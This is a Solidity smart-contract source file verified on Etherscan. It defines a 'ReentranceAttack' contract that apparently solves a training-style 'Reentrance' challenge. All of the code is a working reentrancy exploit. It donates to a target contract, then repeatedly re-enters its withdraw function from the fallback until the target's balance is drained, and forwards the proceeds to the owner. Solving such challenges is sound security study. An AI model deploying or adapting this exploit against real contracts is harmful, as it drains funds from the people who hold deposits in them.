/**
 *Submitted for verification at Etherscan.io on 2021-06-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    
    address public owner;
    
    constructor() public {
        owner = msg.sender;    
    }
    
    receive() external payable {
        IReentrance reentrance = IReentrance(msg.sender);
        uint256 balance = msg.sender.balance;
        if (balance >= msg.value) {
            reentrance.withdraw(msg.value);
        } else if (balance > 0) {
            reentrance.withdraw(balance);
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
    
    function attack(address _reentrance) external payable {
        IReentrance reentrance = IReentrance(_reentrance);
        reentrance.donate.value(msg.value)(address(this));
        reentrance.withdraw(reentrance.balanceOf(address(this)));
    }
}